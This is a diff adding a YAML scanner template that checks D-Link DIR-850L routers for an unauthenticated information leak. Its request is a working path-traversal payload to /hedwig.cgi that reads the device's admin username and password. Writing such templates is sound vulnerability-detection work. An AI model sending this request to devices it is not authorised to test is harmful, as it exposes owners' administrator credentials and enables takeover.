@@ -1,0 +1,22 @@
+name: Dlink 850L Info Leak
+manual: true
+query: (app="DIR-850L" | title=="DIR-850L")
+transport: http
+rules:
+  r0:
+    request:
+      method: POST
+      path: /hedwig.cgi
+      headers:
+        Content-Type: text/xml
+        Cookie: uid=R8tBjwtFc7
+      body: <?xml version="1.0" encoding="utf-8"?><postxml><module><service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service></module></postxml>
+    expression: response.status == 200 && response.body.bcontains(b"&lt;/usrid&gt;")
+      && response.body.bcontains(b"&lt;/password&gt;") && response.body.bcontains(b"&lt;result&gt;OK&lt;/result&gt;")
+expression: r0()
+detail:
+  author: aetkrad
+  links:
+  - https://xz.aliyun.com/t/2941
+  description: D-Link 850L 发现可以未授权加载 htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml.php 文件并获得管理员账号密码等敏感信息
+  tags: infoleak
